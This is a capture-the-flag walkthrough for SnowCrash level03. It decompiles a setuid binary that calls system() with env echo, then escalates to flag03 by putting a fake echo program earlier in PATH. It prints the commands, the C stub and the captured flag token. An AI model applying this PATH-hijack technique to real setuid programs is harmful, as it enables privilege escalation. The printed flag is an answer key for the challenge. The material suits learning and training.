# Level03

## Walkthrough

First, let's check the content of the home directory.

```bash
level03@SnowCrash:~$ ls -la
total 24
dr-x------ 1 level03 level03  120 Mar  5  2016 .
d--x--x--x 1 root    users    340 Aug 30  2015 ..
-r-x------ 1 level03 level03  220 Apr  3  2012 .bash_logout
-r-x------ 1 level03 level03 3518 Aug 30  2015 .bashrc
-r-x------ 1 level03 level03  675 Apr  3  2012 .profile
-rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
level03@SnowCrash:~$ file level03 
level03: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0x3bee584f790153856e826e38544b9e80ac184b7b, not stripped
```

The `s` on `level03` permissions indicates the [setuid bit](https://en.wikipedia.org/wiki/Setuid). This means that the file will run with the privileges of its owner instead of the user executing it. In our case, the owner is `flag03`.

To analyze the file, we transfer it to our local machine using SCP.

```bash
host:~$ scp -P 4242 level02@localhost:level03 level03
```

We decompile the binary using a decompiler explorer like [dogbolt](http://dogbolt.org).

[Link to the decompiled output](https://dogbolt.org/?id=0a105cdf-9237-4e31-9773-e9a12740c81a)

By checking the main function, we can figure out that the program:
- calls `getegid()` and `geteuid()` to retrieve the effective group ID and user ID
- sets them with `setresgid()` and `setresuid()` (in our case: `flag03`)
- executes a shell command (`echo`) with `system()`

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
	__gid_t v4; // [esp+18h] [ebp-8h]
	__uid_t v5; // [esp+1Ch] [ebp-4h]

	v4 = getegid();
	v5 = geteuid();
	setresgid(v4, v4, v4);
	setresuid(v5, v5, v5);
	return system("/usr/bin/env echo Exploit me");
}
```

How can we exploit this program? By running the `getflag` command, with the `flag03` privileges, inside the `system()` call.  
Although we cannot modify the arguments passed to the system call directly, we can exploit the fact that `echo` is a built-in command and alter it’s behavior to execute the `getflag` command instead.

We then have to create our own version of `echo` in the `/tmp` directory and add it to the `$PATH` so that it will be invoked instead of the original one. After that, we just run the script and voila, it executes the `getflag` command as `flag03`.

```bash
level03@SnowCrash:~$ cd /tmp && mkdir echo
level03@SnowCrash:/tmp$ cd echo && touch echo.c
level03@SnowCrash:/tmp/echo$ vim echo.c
# paste the c program from below
level03@SnowCrash:/tmp/echo$ gcc echo.c -o echo
level03@SnowCrash:/tmp/echo$ ls -la
total 12
drwxrwxr-x 2 level03 level03   80 Feb  8 19:51 .
d-wx-wx-wx 6 root    root     120 Feb  8 19:50 ..
-rwxrwxr-x 1 level03 level03 7160 Feb  8 19:51 echo
-rw-rw-r-- 1 level03 level03   84 Feb  8 19:49 echo.c
level03@SnowCrash:/tmp/echo$ export PATH=/tmp/echo:$PATH
level03@SnowCrash:/tmp/echo$ ~/level03 
Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
```

```c
// echo.c
#include <stdlib.h>

int main(void) {
	system("/usr/bin/env getflag");
	return 1;
}
```
## Resources

- [Exploit system() call in C](https://stackoverflow.com/questions/39939853/exploit-system-call-in-c)
- [How to exploit system() call in C](https://www.go4expert.com/articles/exploit-c-t24920)
